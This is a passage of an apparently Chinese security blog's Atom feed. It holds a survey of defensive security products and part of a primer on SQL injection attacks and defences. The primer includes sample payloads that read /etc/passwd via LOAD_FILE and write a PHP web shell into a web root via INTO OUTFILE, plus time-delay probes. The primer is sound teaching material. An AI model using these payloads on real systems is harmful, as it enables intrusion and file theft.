      <category term="资源导航" scheme="http://www.firehacker.top/categories/0x04-%E6%8B%93%E5%B1%95%E6%A2%B3%E7%90%86/%E8%B5%84%E6%BA%90%E5%AF%BC%E8%88%AA/"/>
    
    
  </entry>
  
  <entry>
    <title>安全防御之产品简述</title>
    <link href="http://www.firehacker.top/2018/09/19/%E5%AE%89%E5%85%A8%E9%98%B2%E5%BE%A1%E4%B9%8B%E4%BA%A7%E5%93%81%E7%AE%80%E8%BF%B0/"/>
    <id>http://www.firehacker.top/2018/09/19/安全防御之产品简述/</id>
    <published>2018-09-19T02:46:34.000Z</published>
    <updated>2018-10-24T06:56:07.317Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>基础安全设备包含构造业务安全防御系统的常用安全设备，能够搭建深度防御体系的各种安全设备、安全软件。本文安全防御产品与设备（检测告警类，安全防护类，监控评估类）简要分析<br><a id="more"></a></p></blockquote><hr><h2 id="0x01-检测告警类"><a href="#0x01-检测告警类" class="headerlink" title="0x01 检测告警类"></a>0x01 检测告警类</h2><h3 id="1-网络入侵检测"><a href="#1-网络入侵检测" class="headerlink" title="1. 网络入侵检测"></a>1. 网络入侵检测</h3><pre><code>用于检测网络入侵事件，常见部署在核心交换上，用于收集核心交换机的镜像流量，通过检测攻击特征形成告警事件</code></pre><p><strong>(1) 开源工具</strong></p><ul><li><p><a href="https://www.snort.org/" target="_blank" rel="noopener">Snort</a> <em>网络入侵检测（IDS）和入侵防御工具（IPS）的领导者，母公司为Sourcefire</em></p></li><li><p><a href="https://www.ossec.net/" target="_blank" rel="noopener">OSSEC</a> <em>一个开源主机入侵检测系统（HIDS），OSSEC客户端能够执行文件完整性监控和rootkit检测，并有实时报警，源自趋势科技</em></p></li><li><p><a href="https://securityonion.net/" target="_blank" rel="noopener">Security Onion</a> <em>用于网络监控和入侵检测的基于Ubuntu的Linux发行版</em></p></li><li><p><a href="https://www.bro.org/" target="_blank" rel="noopener">Bro IDS</a>  <em>类似于Security Onion，它使用更多IDS规则来确定攻击来源</em></p></li><li><p><a href="https://suricata-ids.org/" target="_blank" rel="noopener">Suricata</a> <em>能够与Snort相抗衡，该系统有一个类似Snort的架构，依赖于像 Snort等的签名</em></p></li><li><p><a href="http://openwips-ng.org/" target="_blank" rel="noopener">OpenWIPS-NG </a> <em>一个免费的无线IDS / IPS，它依赖于服务器、传感器和接口</em></p></li></ul><p><strong>(2) 厂商产品</strong></p><p>参考链接：<a href="https://www.aqniu.com/tools-tech/667.html" target="_blank" rel="noopener">https://www.aqniu.com/tools-tech/667.html</a></p><p><strong><em>国内厂商：</em></strong> <em>绿盟  启明星辰  山石网科  华为   H3C</em></p><h3 id="2-网络流量分析"><a href="#2-网络流量分析" class="headerlink" title="2. 网络流量分析"></a>2. 网络流量分析</h3><pre><code>镜像流量分析，通常也是连接到核心交换，可以分析流量，可以回溯流量，遇到分析安全事件的时候可以通过回溯流量分析攻击过程</code></pre><p><strong><em>国内厂商：</em></strong> <em>绿盟  科来  恒安嘉新  力合智远</em></p><hr><h2 id="0x02-安全防护类"><a href="#0x02-安全防护类" class="headerlink" title="0x02 安全防护类"></a>0x02 安全防护类</h2><h3 id="1-抗D服务"><a href="#1-抗D服务" class="headerlink" title="1. 抗D服务"></a>1. 抗D服务</h3><pre><code>部署在主链路上，内部网络的抗D设备可以处理低于出口带宽的 DDoS 流量，超过的一般用云抗D服务</code></pre><ul><li><p><a href="http://www.nsfocus.com.cn/operations/details_4_280.html" target="_blank" rel="noopener">绿盟ADS</a> <em>十多年抗D攻防技术积累、专业抗D运营团队、完整的攻击分析平台和技术交付平台</em></p></li><li><p><a href="http://www.damddos.com/" target="_blank" rel="noopener">中国电信云堤</a> <em>运营商级的防护能力无疑在对抗超大流量攻击方面具备很强优势</em></p></li><li><p><a href="https://yundun.aliyun.com/" target="_blank" rel="noopener">阿里云云盾</a> <em>依托阿里云基础设施，支持BGP和CDN两种引流，并在应用层DDOS方面独具优势</em></p></li><li><p><a href="https://cloud.tencent.com/product/bad" target="_blank" rel="noopener">腾讯云大禹</a> <em>来自自身产品防护的长期实践，在一些游戏或社交产品的攻击防护上优势明显</em></p></li><li><p><a href="https://cloud.360.cn/" target="_blank" rel="noopener">360云安全</a> <em>通过CDN加速体系来提供抗D服务，符合其“数据驱动安全”的总体思路</em></p></li></ul><p>参考链接：<a href="https://www.aqniu.com/industry/8116.html" target="_blank" rel="noopener">https://www.aqniu.com/industry/8116.html</a></p><h3 id="2-防火墙"><a href="#2-防火墙" class="headerlink" title="2. 防火墙"></a>2. 防火墙</h3><pre><code>用于做网络边界区分，实际应用中最有用的是网络访问控制。常见部署在核心路由和核心交换机之间，或者在应用服务器和数据库服务器之间，或者不同的业务之间，有边界隔离需求的都可以部署</code></pre><p><strong>(1) 企业级防火墙</strong></p><p><img src="http://pdeise3e3.bkt.clouddn.com/%E9%98%B2%E7%81%AB%E5%A2%99%E9%AD%94%E5%8A%9B%E8%B1%A1%E9%99%90.png" alt=""></p><p>参考链接：<a href="https://www.aqniu.com/tools-tech/26863.html" target="_blank" rel="noopener">https://www.aqniu.com/tools-tech/26863.html</a></p><p><strong><em>国内厂商：</em></strong> <em>天融信  山石网科  华为  360安全 深信服</em></p><p><strong>(2) 开源防火墙</strong></p><ul><li><p><a href="https://www.netfilter.org/" target="_blank" rel="noopener">Iptables</a> <em>Iptables/Netfilter是基于防火墙的最流行的命令行，它是Linux服务器安全的头道防线</em></p></li><li><p><a href="http://www.ipcop.org/" target="_blank" rel="noopener">IPCop</a> <em>IPCop的设计界面非常友好，便于管理，它对于小型企业和本地PC非常实用</em></p></li><li><p><a href="https://configserver.com/cp/csf.html" target="_blank" rel="noopener">ConfigServer Security Firewall</a> <em>一个跨平台的多用途防火墙，基于状态包检测，几乎支持所有的虚拟化环境</em></p></li></ul><p>参考链接：</p><ul><li><p>十大Linux开源防火墙：<a href="http://tomcat-oracle.iteye.com/blog/2007409" target="_blank" rel="noopener">http://tomcat-oracle.iteye.com/blog/2007409</a></p></li><li><p>Windows 防火墙概述及实践：<a href="https://yq.aliyun.com/articles/113211" target="_blank" rel="noopener">https://yq.aliyun.com/articles/113211</a></p></li></ul><h3 id="3-WAF"><a href="#3-WAF" class="headerlink" title="3. WAF"></a>3. WAF</h3><pre><code>Web应用防火墙提供了应用层的防护能力，常见部署在应用服务器与核心交换之间，或者核心交换与核心防火墙之间，部分复杂业务系统系统，WAF以旁路镜像流量的方式作为Web的入侵检测设备存在，只检测Web攻击事件</code></pre><p><img src="http://pdeise3e3.bkt.clouddn.com/WAF%E9%AD%94%E6%96%B9.png" alt=""></p><ul><li><em>Web应用防火墙魔力象限，资料来源：Gartner（2017年8月）</em></li></ul><p>参考链接：<a href="https://www.secrss.com/articles/4985" target="_blank" rel="noopener">https://www.secrss.com/articles/4985</a></p><p><strong><em>国内厂商：</em></strong> <em>安恒信息  绿盟  长亭科技  盛邦安全   铱迅信息  </em></p><h3 id="4-入侵防御"><a href="#4-入侵防御" class="headerlink" title="4. 入侵防御"></a>4. 入侵防御</h3><pre><code>逻辑是串在主链路上，真用作防御功能的情况还是比较少，需要业务简单，交互情况少的情况下。误报和漏报需要平衡好</code></pre><h3 id="5-反病毒"><a href="#5-反病毒" class="headerlink" title="5. 反病毒"></a>5. 反病毒</h3><pre><code>目前普遍部署在企业网络的杀毒软件都是基于 Windows 版的，使用统一管理，可以从整体查看病毒在组织网络中的感染情况。企业网策略比较保守，发现病毒只是告警，不直接删除或清除，有可能导致系统文件出错</code></pre><ul><li><p><a href="https://www.kaspersky.com.cn/antivirus" target="_blank" rel="noopener">卡巴斯基(KIS/KAV)</a> <em>卡巴斯基全功能安全软件(KIS)=卡巴斯基反病毒软件(KAV)+网络防火墙</em></p></li><li><p><a href="https://cn.norton.com/antivirus" target="_blank" rel="noopener">诺顿防病毒软件</a> <em>赛门铁克公司推出，独创的基于信誉评级的诺顿全球智能云防护</em></p></li><li><p><a href="https://www.microsoft.com/zh-cn/download/details.aspx?id=5201" target="_blank" rel="noopener">微软免费杀毒软件(MSE)</a> <em>一款通过正版验证的Windows电脑可以免费使用的微软安全防护软件</em></p></li><li><p><a href="https://www.avira.com/zh-cn/download/product/avira-free-antivirus" target="_blank" rel="noopener">Avira AntiVir Personal(小红伞）</a> <em>一款个人版本的防病毒软件，它能有效地保护个人电脑以及工作站的使用</em></p></li><li><p><a href="https://home.mcafee.com/root/landingpage.aspx?affid=101&amp;lpname=14185vsp&amp;cid=39890&amp;culture=en-US&amp;legacylangcd=en-us" target="_blank" rel="noopener">McAfee VirusScan Plus</a> <em>让每个人都可以毫无困扰地实现重要的PC保护，使PC免受病毒和间谍软件的侵扰</em></p></li><li><p><a href="http://sd.360.cn/" target="_blank" rel="noopener">360杀毒</a> <em>无缝整合了国际知名 BitDefender 病毒查杀引擎，以及360安全中心潜心研发的木马云查杀引擎</em></p></li><li><p><a href="https://www.download3k.com/Antivirus-Spyware-Cleaners/Antivirus/Download-free-Antivirus-and-AntiSpyware-MWAV.html" target="_blank" rel="noopener">超级巡警</a> <em>专门查杀各种木马、流氓软件、Rootkit、后门、恶意代码、间谍软件、蠕虫病毒等</em></p></li><li><p><a href="http://shop.micropoint.com.cn/product/" target="_blank" rel="noopener">微点主动防御软件</a> <em>第三代反病毒软件，采用主动防御技术能够自主分析判断病毒</em></p></li><li><p><a href="http://www.jiangmin.com/enterprise/kvnet/" target="_blank" rel="noopener">江民杀毒软件</a> <em>全新动态启发式杀毒引擎，融入指纹加速功能，杀毒功能更强、速度更快</em></p></li><li><p><a href="http://www.duba.net/" target="_blank" rel="noopener">金山毒霸11</a> <em>世界首款应用”可信云查杀”的杀毒软件，采用本地正常文件白名单快速匹配技术</em></p></li><li><p><a href="http://antivirus.rising.com.cn/" target="_blank" rel="noopener">瑞星杀毒软件V17</a> <em>一款基于瑞星“云安全”系统设计的新一代杀毒软件，其“整体防御系统”可将所有互联网威胁拦截在用户电脑以外</em></p></li></ul><p>参考链接：<a href="https://g.pconline.com.cn/x/894/8948669.html" target="_blank" rel="noopener">https://g.pconline.com.cn/x/894/8948669.html</a></p><hr><h2 id="0x03-监管审计类"><a href="#0x03-监管审计类" class="headerlink" title="0x03 监管审计类"></a>0x03 监管审计类</h2><h3 id="1-漏洞扫描"><a href="#1-漏洞扫描" class="headerlink" title="1. 漏洞扫描"></a>1. 漏洞扫描</h3><p><strong>(1) 开源工具</strong></p><ul><li><p><a href="https://www.tenable.com/products/nessus/nessus-professional" target="_blank" rel="noopener">Nessus</a> <em>目前全世界最多人使用的系统漏洞扫描与分析软件</em></p></li><li><p><a href="https://github.com/sullo/nikto" target="_blank" rel="noopener">Nikto</a> <em>一款开源的(GPL)网页服务器扫描器，它可以对网页服务器进行全面的多种扫描</em></p></li><li><p><a href="http://www.openvas.org/" target="_blank" rel="noopener">Openvas</a> <em>一个提供漏洞扫描和漏洞管理的多种服务和工具的软件框架</em></p></li></ul><ul><li><a href="https://github.com/sensepost/wikto" target="_blank" rel="noopener">Wikto</a> <em>一个Web 服务器评估工具，可以检查Web 服务器中的漏洞，功能丰富</em></li></ul><p><strong>(2) 商业产品</strong></p><ul><li><p><a href="https://www.ibm.com/security/application-security/appscan" target="_blank" rel="noopener">Appscan</a> <em>IBM公司开发的用于扫描web应用的基础架构，安全渗透行业领军产品</em></p></li><li><p><a href="https://www.acunetix.com/vulnerability-scanner/" target="_blank" rel="noopener">AWVS</a> <em>Acunetix Web Vulnerability Scanner，一款商业级的Web漏洞扫描程序，它可以检查Web应用程序中的漏洞</em></p></li></ul><ul><li><p><a href="https://www.nstalker.com/nstealth/" target="_blank" rel="noopener">N-Stealth</a>：ZMT公司出品的一款商业的WEB站点安全扫描软件，升级频率较高</p></li><li><p><a href="https://cloud.nsfocus.com/#/krosa/views/initcdr/productandservice?page_id=90" target="_blank" rel="noopener">绿盟极光</a>：绿盟科技研发的远程安全评估系统，可以进行Web应用、Web 服务及支撑系统等多层次全方位的安全漏洞扫描</p></li><li><p><a href="http://www1.dbappsecurity.com.cn/pro_main.aspx?id=98AB5C7F66B78DEE" target="_blank" rel="noopener">安恒 MatriXay WebScan</a>：安恒信息研发的明鉴TM系列产品，被作为公安部等级保护测评中心专用应用安全测评工具</p></li></ul><p>参考链接：</p><ul><li><p><a href="https://zhuanlan.zhihu.com/p/25405238" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/25405238</a></p></li><li><p><a href="http://blog.51cto.com/907832555/1868550" target="_blank" rel="noopener">http://blog.51cto.com/907832555/1868550</a></p></li><li><p><a href="http://www.voidcn.com/article/p-mseotuep-kn.html" target="_blank" rel="noopener">http://www.voidcn.com/article/p-mseotuep-kn.html</a></p></li></ul><h3 id="2-配置核查"><a href="#2-配置核查" class="headerlink" title="2. 配置核查"></a>2. 配置核查</h3><pre><code>实现统一的安全配置标准以便规范日常的安全配置操作，快速有效地对网络中种类、数量繁多的设备和软件进行安全配置检测，集中收集核查结果，快速出报告</code></pre><h3 id="3-网络安全监控"><a href="#3-网络安全监控" class="headerlink" title="3. 网络安全监控"></a>3. 网络安全监控</h3><pre><code>可以对网站漏洞、网站内容、网站可用性监控的设备，属于主动扫描类的工具漏扫、配置检查、网站监控都是属于主动扫描的设备</code></pre><h3 id="4-堡垒机"><a href="#4-堡垒机" class="headerlink" title="4. 堡垒机"></a>4. 堡垒机</h3><pre><code>也叫运维审计系统，可以配合 Windows 域或其他认证系统，对运维人员的操作进行审计，可用于网络访问控制</code></pre><h3 id="5-日志审计"><a href="#5-日志审计" class="headerlink" title="5. 日志审计"></a>5. 日志审计</h3><pre><code>传统日志审计，后台使用关系型数据库的，局限性很大，相当于各种日志数据处理后放到一个数据库中，安全事件发生后可以用作做事件回溯查询。数据量大了后表现就是查询速度很慢。另外一般设备是一个盒子，保存的数据量也有限</code></pre><h3 id="6-数据库审计"><a href="#6-数据库审计" class="headerlink" title="6. 数据库审计"></a>6. 数据库审计</h3><pre><code>镜像应用到数据库的流量，可以获得所有的数据库操作请求，通过设定一定的规则也能检测针对数据库的攻击</code></pre><hr><h2 id="0x04-企业安全理念"><a href="#0x04-企业安全理念" class="headerlink" title="0x04 企业安全理念"></a>0x04 企业安全理念</h2><ul><li><p><a href="http://www.nsfocus.com.cn/About_NSFOCUS/IntelligentSecurity.html" target="_blank" rel="noopener">绿盟科技</a>：智慧安全2.0</p></li><li><p><a href="https://www.360.net/" target="_blank" rel="noopener">360企业安全</a> ：数据驱动安全</p></li><li><p><a href="https://www.hansight.com/" target="_blank" rel="noopener">HanSight</a>：大数据分析安全</p></li><li><p><a href="https://qingteng.cn/" target="_blank" rel="noopener">青藤云</a>：云时代的自适应安全</p></li><li><p><a href="http://www.dynarose.com/" target="_blank" rel="noopener">蔷薇灵动</a>：自适应微隔离</p></li><li><p><a href="https://threatbook.cn/" target="_blank" rel="noopener">微步在线</a>：安全智能，情报驱动</p></li></ul><hr><h2 id="0xFF-参考资源"><a href="#0xFF-参考资源" class="headerlink" title="0xFF 参考资源"></a>0xFF 参考资源</h2><ul><li><p><a href="https://www.aqniu.com/industry/36011.html" target="_blank" rel="noopener">安全牛-网络安全行业全景图</a></p></li><li><p><a href="https://www.anquanquan.info/anquankaiyuan.html" target="_blank" rel="noopener">安全圈info-安全开源项目</a></p></li><li><p><a href="https://www.aqniu.com/industry/36011.html" target="_blank" rel="noopener">安全牛-安全行业全景图分析</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;基础安全设备包含构造业务安全防御系统的常用安全设备，能够搭建深度防御体系的各种安全设备、安全软件。本文安全防御产品与设备（检测告警类，安全防护类，监控评估类）简要分析&lt;br&gt;
    
    </summary>
    
      <category term="0x02 原理浅析" scheme="http://www.firehacker.top/categories/0x02-%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/"/>
    
      <category term="安全产品" scheme="http://www.firehacker.top/categories/0x02-%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81/"/>
    
    
      <category term="SecProducts" scheme="http://www.firehacker.top/tags/SecProducts/"/>
    
  </entry>
  
  <entry>
    <title>Web攻防技术浅析</title>
    <link href="http://www.firehacker.top/2018/09/12/Web%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF%E6%B5%85%E6%9E%90/"/>
    <id>http://www.firehacker.top/2018/09/12/Web攻防技术浅析/</id>
    <published>2018-09-12T02:23:07.000Z</published>
    <updated>2018-10-16T04:11:29.529Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文对Web常用攻击手段与防御技术进行简要总结，涉及SQL注入与WAF防护，XSS攻击与防御，CSRF/SSRF原理及异同，越权漏洞及防御，文件上传漏洞，应用层DDOS等</p></blockquote><a id="more"></a><hr><h2 id="0x00-Web安全基础"><a href="#0x00-Web安全基础" class="headerlink" title="0x00  Web安全基础"></a>0x00  Web安全基础</h2><h3 id="1-Web安全漏洞"><a href="#1-Web安全漏洞" class="headerlink" title="1. Web安全漏洞"></a>1. Web安全漏洞</h3><p><img src="http://pbegz2k88.bkt.clouddn.com/web%E6%BC%8F%E6%B4%9E.png" alt=""></p><p><em>图片来自：绿盟科技博客</em></p><h3 id="2-安全编码规范"><a href="#2-安全编码规范" class="headerlink" title="2. 安全编码规范"></a>2. 安全编码规范</h3><p><a href="http://www.owasp.org.cn/owasp-project/download/OWASP_SCP_Quick_Reference_GuideChinese.pdf" target="_blank" rel="noopener">OWASP 安全编码规范快速参考指南</a></p><p><img src="http://pbegz2k88.bkt.clouddn.com/%E8%BE%93%E5%85%A5%E9%AA%8C%E8%AF%81.png" alt=""></p><p><img src="http://pbegz2k88.bkt.clouddn.com/%E8%BE%93%E5%87%BA%E7%BC%96%E7%A0%81.png" alt=""></p><h3 id="3-Web应用架构"><a href="#3-Web应用架构" class="headerlink" title="3. Web应用架构"></a>3. Web应用架构</h3><p><strong>三层架构</strong></p><p><img src="http://pbegz2k88.bkt.clouddn.com/web%E4%B8%89%E5%B1%82%E6%9E%B6%E6%9E%84.png" alt=""></p><p><strong>四层架构</strong></p><p><img src="http://pbegz2k88.bkt.clouddn.com/web%E5%9B%9B%E5%B1%82%E6%9E%B6%E6%9E%84.png" alt=""></p><p><em>图片参考自：《SQL Injection Attacks and Defense》</em></p><hr><h2 id="0x01-SQL注入及防御"><a href="#0x01-SQL注入及防御" class="headerlink" title="0x01 SQL注入及防御"></a>0x01 SQL注入及防御</h2><h3 id="1-本质及原理"><a href="#1-本质及原理" class="headerlink" title="1. 本质及原理"></a>1. 本质及原理</h3><h4 id="1-定义"><a href="#1-定义" class="headerlink" title="(1) 定义"></a><strong>(1) 定义</strong></h4><p>SQL注入式一种通过操纵输入来修改后台SQL语句以达到利用攻击代码进行攻击的技术</p><h4 id="2-本质"><a href="#2-本质" class="headerlink" title="(2) 本质"></a><strong>(2) 本质</strong></h4><p>对于输入检查不充分，导致SQL语句将用户提交的非法数据当作语句的一部分来执行</p><h4 id="3-产生原理"><a href="#3-产生原理" class="headerlink" title="(3) 产生原理"></a><strong>(3) 产生原理</strong></h4><p>SQL是访问<em>Microsoft SQL Server,Oracle,MySQL，Sybase 和Informix</em>等数据库服务器的标准语言，大多数Web应用都要与数据库进行交互，并且多数Web应用编程语言(<em>ASP,C#,.NET,Java和PHP</em>)均提供可编程的方法与数据库相连并进行交互，当从Web表单，cookie及输入参数等收到的值传递给SQL查询(该查询在数据库服务器上执行)之前未对其进行验证，则会出现SQL注入漏洞</p><h4 id="4-引发因素"><a href="#4-引发因素" class="headerlink" title="(4) 引发因素"></a><strong>(4) 引发因素</strong></h4><p><strong>A. 转义字符处理不当</strong></p><p>SQL数据库将<em>单引号字符</em>(‘)解析成字符串分隔符，作为代码与数据间的分界线，利用单引号可构造查询加以执行，判断Web站点是否会受到SQL注入攻击；Oracle中，空格，双竖线，逗号，点号，双引号等均有特殊含义</p><p><strong>B. 类型处理不当</strong></p><p><strong><em>LOAD_FILE</em></strong> 函数：能够读取文件并将文件内容作为字符串返回，读取的文件须位于数据库服务器主机上，如下可获取系统用户的属性和用户名</p><pre><code>UNION ALL SELECT LOAD_FILE(&apos;/etc/passwd&apos;)--</code></pre><p><strong><em>SELECT INTO OUTFILE</em></strong> 内置命令：可用来创建系统文件并进行写操作，受攻击用户须拥有FILE权限，如下可向Web根目录写入一个Web shell 以便安装可远程交互访问的Web shell</p><pre><code>UNION SELECT &quot;&lt;?system($_request[&apos;cmd&apos;]);?&gt;&quot; INTO OUFILE &quot;/var/www/html/victim.com/cmd.php&quot;--</code></pre><p><strong>C. 查询集处理不当</strong></p><p><strong>D. 错误处理不当</strong></p><p>可能将详细的内部错误消息(如数据库转储，错误代码等)显示给用户或者攻击者，造成消息泄露</p><p><strong>E. 多个提交处理不当</strong></p><p><strong>F. 不安全的数据库配置</strong></p><p>数据库默认的用户预安装内容，用户权限，访问控制模型等也可能存在风险</p><h3 id="2-攻击及方式"><a href="#2-攻击及方式" class="headerlink" title="2. 攻击及方式"></a>2. 攻击及方式</h3><h4 id="1-寻找-SQL-注入点"><a href="#1-寻找-SQL-注入点" class="headerlink" title="(1) 寻找 SQL 注入点"></a><strong>(1) 寻找 SQL 注入点</strong></h4><p>通过操纵用户数据输入并分析服务器响应来寻找SQL注入漏洞</p><p><strong>A. 通过发送意外数据来触发异常</strong></p><p><strong>a 识别数据输入</strong></p><p><strong><em>GEI请求：</em></strong> 一种请求服务器的HTTP方法，使用该方法时，信息显示在URL中，GET请求对用户是透明的；点击一个链接时，一般用此方法</p><p><strong><em>POST请求：</em></strong>一种向Web服务器发送信息的HTTP方法，在浏览器器中填写表单并点击提交按钮时通常使用该方法</p><p><strong><em>其他注入型数据</em></strong></p><p><em>Cookie：</em>被发送给用户端浏览器，并在每个请求中自动回发给服务器；一般用于验证，会话控制和保存用户特定信息</p><p><em>主机头：</em>指定请求资源的 Internet主机和端口号</p><p><em>referer：</em>指定获取当前请求的资源</p><p><em>用户代理头：</em>确定用户使用的Web浏览器</p><p><strong><em>绕过浏览器限制修改数据</em></strong></p><p><em>使用浏览器修改扩展插件：</em>如Web Developer，Tamper Data等</p><p><em>使用本地代理：</em>介于浏览器与服务器之间的软件，代理负责拦截发给Web服务器的请求，用户可随意修改请求的内容</p><p><strong>b 操纵数据分析响应异常</strong></p><p><img src="http://pbegz2k88.bkt.clouddn.com/%E4%BF%A1%E6%81%AF%E6%B5%81.png" alt=""></p><pre><code>1. 用户向Web服务器发送请求2. Web服务器检索用户数据，创建包含用户输入的SQL语句，然后向数据库服务器发送查询3. 数据库服务器执行SQL查询语句并将结果返回给Web服务器4. Web服务器根据数据库响应动态创建HTML页面 </code></pre><p><strong>B. 数据库错误</strong></p><p>后台数据库执行查询失败时应用汇返回相应错误类型</p><p><img src="http://pbegz2k88.bkt.clouddn.com/%E6%95%B0%E6%8D%AE%E5%BA%93%E9%94%99%E8%AF%AF.png" alt=""></p><pre><code>1. 用户发送请求，尝试识别SQL注入漏洞，如发送带单引号的值2. Web服务器检索用户数据并向数据库服务器发送SQL查询3. 数据库服务器接收格式不正确的SQL查询并向Web服务器返回一条错误消息4. Web服务器接收来自数据库的错误并向用户发送HTML响应</code></pre><p><strong>C. 应用响应</strong></p><p>一些不直接在浏览器响应的错误示例</p><p><strong>a 通用错误</strong></p><p>不管遇到何种错误，应用均返回一个通用的错误页面，可以通过向参数插入不会触发应用错误的SQL代码来进行测试</p><p>如<strong><em>构造恒真表达式</em></strong>，将数据注入到一个用单引号引起来的字符串中，查询的结果会包含表中所有记录，当记录较多，查询执行时间很长且耗费数据库和Web服务器大量资源</p><p>故可构造永假表达式进行测试</p><p><strong>b http返回码错误</strong></p><p>HTTP包含很多返回给Web浏览器的代码，用来指定请求的结果或客户端需要执行的操作</p><p><strong><em>HTTP 500：</em></strong> web服务器在呈现请求的web源时，发现错误</p><p><strong><em>HTTP 302：</em></strong>重定向到主页/自定义错误页面</p><p><strong>c 不同的响应大小</strong></p><p>适用于不显示任何结果或差异不明显的情况</p><p><strong>D. SQL盲注</strong></p><p>在服务器没有错误回显是采用的注入攻击方式，构造条件语句，根据页面是否发生变化，来判断SQL语句是否执行</p><h4 id="2-实施-SQL-注入"><a href="#2-实施-SQL-注入" class="headerlink" title="(2) 实施 SQL 注入"></a><strong>(2) 实施 SQL 注入</strong></h4><p>构造有效的SQL语句来实施利用SQL注入漏洞</p><p><strong>A. 区分数字和字符串</strong></p><p><strong><em>数字：</em></strong>不需要使用单引号来表示</p><p><strong><em>字符串：</em></strong>使用单引号来表示</p><p>数字字母混合值用单引号引起来</p><p><strong>B. 内联SQL注入</strong></p><p><img src="http://pbegz2k88.bkt.clouddn.com/%E5%86%85%E8%81%94%E6%B3%A8%E5%85%A5.png" alt=""></p><p><strong><em>Inline SQL Injection：</em></strong>向查询注入一些SQL代码后，原来的查询依然会全部执行</p><p><strong>a 字符串内联注入</strong></p><p><img src="http://pbegz2k88.bkt.clouddn.com/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%86%85%E8%81%94.png" alt=""></p><p><strong>b 数字内联注入</strong></p><p><img src="http://pbegz2k88.bkt.clouddn.com/%E6%95%B0%E5%AD%97%E5%86%85%E8%81%94.png" alt=""></p><p><strong>C. 终止式SQL注入</strong></p><p>注释剩下的查询语句来成功结束该语句</p><p><img src="http://pbegz2k88.bkt.clouddn.com/%E7%BB%88%E6%AD%A2%E6%B3%A8%E5%85%A5.png" alt=""></p><p><strong>a 数据库注释语法</strong></p><p><img src="http://pbegz2k88.bkt.clouddn.com/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E9%87%8A.png" alt=""></p><p><strong>b 注释常用特征值</strong></p><p><img src="http://pbegz2k88.bkt.clouddn.com/%E6%B3%A8%E9%87%8A%E7%89%B9%E5%BE%81%E5%80%BC.png" alt=""></p><p><strong>D. 时间延迟攻击</strong></p><p><strong><em>Timing Attack：</em></strong>当Web应用未显示任何错误时，可向数据库注入时间延迟并检查服务器响应是否延迟实施注入</p><p><strong><em>Microsoft SQL 服务器</em></strong></p><pre><code>WAITFOR DELAY &apos;hours:minutes:seconds&apos;</code></pre><p><strong><em>MySQL 数据库</em></strong></p><pre><code>mysql&gt; SELECT BENCHMARK(100000,ENCODE(&apos;hello&apos;,&apos;world&apos;));</code></pre><p><em>BENCHMARK</em>函数将一条表达式执行多次，来引入延迟</p><h3 id="3-防御及思路"><a href="#3-防御及思路" class="headerlink" title="3. 防御及思路"></a>3. 防御及思路</h3><h4 id="1-代码层防御"><a href="#1-代码层防御" class="headerlink" title="(1) 代码层防御"></a><strong>(1) 代码层防御</strong></h4><p><strong>A. 使用参数化语句</strong></p><p><strong><em>避免使用动态SQL来阻止SQL注入</em></strong></p><p>使用占位符或绑定变量来向SQL查询提供参数(而非直接对用户输入进行操作)，替换动态字符串构造，不会修改传递给数据库的内容</p><p>但如果正在调用的数据库功能在存储过程或函数实现使用了<strong>动态SQL</strong>(将SQL查询创建成字符串然后发给数据库执行)，仍会出现SQL注入</p><p>只能参数化数据值，不能参数化SQL标识符或关键字</p><p><strong>B. 输入验证</strong></p><p><strong>a 白名单验证</strong></p><p>只接收已记录在案的良好输入的操作，验证输入是否符合所期望的<strong><em>数据类型，数据大小，数据范围</em></strong>和<strong><em>数据内容</em></strong>等</p><p>白名单验证功能更强大，适用于带大字符集的语言来实现本地化的应用；对于存在复杂输入或难以确定所有可能的输入集合石，实现叫困难</p><p><strong>b 黑名单</strong></p><p>拒绝已记录在案的不良输入操作，通过浏览输入的内容查找是否存在已知的不良字符，字符串或模式</p><p>验证功能较弱，潜在的不良字符列表较大，检索较慢；很难及时更新列表，对安全性未知的列表无法判断</p><p>常使用正则表达式实现，附加一个禁止使用的字符串列表</p><p><strong>C. 编码输出</strong></p><p>对在应用的不同模块或部分间传递的内容进行编码，保证内容被正确处理，尤其是对于未经严格验证或审查以及来自第三方的数据源</p><p><strong>D. 规范化</strong></p><p>未规范的编码方法，依赖于所使用的特定条件，很难预测应用是否会按照这种方式进行解释，规范化指将输入简化成标准形式</p><p><strong>E. 设计优化</strong></p><p>使用存储过程以便在数据库层拥有较细粒度的许可</p><p>使用数据访问抽象层来对整个应用世家安全的数据访问</p><p>设计时，考虑对敏感信息进行附加的控制</p><h4 id="2-平台层防御"><a href="#2-平台层防御" class="headerlink" title="(2) 平台层防御"></a><strong>(2) 平台层防御</strong></h4><p><strong>A. 运行时保护</strong></p><p><strong>a WAF-Web应用防火墙</strong></p><p>WAF的标准是开源的 <a href="https://www.modsecurity.org" target="_blank" rel="noopener">ModSecurity</a>-被开发为Apache的一个模块，可实现攻击预防，监控，入侵检测和一般应用加固</p><pre><code>1. 可配置规则集2. 请求覆盖范围3. 请求标准化4. 响应分析5. 入侵检测能力</code></pre><p><strong>b 截断过滤器</strong></p><p>过滤器是一系列独立的模块，可跨应用重用，适用于输入验证，将请求/响应记录到日志以及转换输出响应等安全功能</p><p><img src="http://pbegz2k88.bkt.clouddn.com/%E8%BF%87%E6%BB%A4%E5%99%A8.png" alt=""></p><p><strong><em>Web服务器过滤器</em></strong></p><p>将过滤器实现成Web服务器模块/插件，能对核心请求和响应进行扩展以便处理Web服务器平台的API；不针对特定的Web应用框架或编程语言</p><p><strong><em>应用过滤器</em></strong></p><p>使用Web应用的编程语言或框架来实现过滤器，适用于实时保护，部署速度快</p><p><strong>c URL策略/页面层策略</strong></p><ol><li><p>页面覆写</p></li><li><p>URL 重写</p></li><li><p>资源代理/封装</p></li></ol><p><strong>d 应用入侵检测系统</strong></p><p><strong>e 数据库防火墙</strong></p><p><strong>B. 确保数据库安全</strong></p><p><strong>a 锁定应用数据</strong></p><p>确保应用数据的安全</p><pre><code>1. 